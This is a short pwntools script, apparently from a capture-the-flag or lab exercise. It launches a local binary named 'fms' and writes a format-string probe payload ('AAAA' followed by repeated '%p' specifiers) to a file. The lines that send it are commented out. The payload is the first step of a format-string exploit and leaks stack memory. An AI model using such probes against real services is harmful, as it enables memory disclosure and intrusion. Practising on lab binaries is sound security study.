from pwn import *

s = process("./fms")

payload = "AAAA." + "%p." * 6

with open("pay", "w+") as file:
    file.write(payload)

# s.sendline(payload)
# print(s.recvall())
